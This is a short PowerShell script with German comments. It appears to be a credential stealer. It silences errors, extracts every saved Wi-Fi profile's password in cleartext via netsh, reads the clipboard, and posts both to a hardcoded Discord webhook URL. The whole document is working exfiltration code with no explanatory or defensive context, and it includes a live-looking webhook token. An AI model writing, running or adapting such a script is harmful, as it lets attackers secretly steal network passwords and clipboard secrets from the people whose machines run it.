$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"
$ErrorActionPreference = "SilentlyContinue"

# WLAN Passwörter
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
$wifiInfo = ">>> WLAN Passwörter <<<`n"
foreach ($profile in $wifiProfiles) {
    $keyOutput = netsh wlan show profile name="$profile" key=clear
    $keyLine = $keyOutput | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $password = if ($keyLine) { $keyLine } else { "Not Found" }
    $wifiInfo += "`n📶 SSID: $profile`n🔑 Passwort: $password`n"
}

# Clipboard Inhalt
$clip = Get-Clipboard
$clipInfo = ">>> Clipboard <<<`n$clip"

# An Discord senden
function SendDiscord($msg) {
    $json = @{content = $msg} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $json -ContentType "application/json"
}

SendDiscord -msg $wifiInfo
Start-Sleep -Seconds 2
SendDiscord -msg $clipInfo
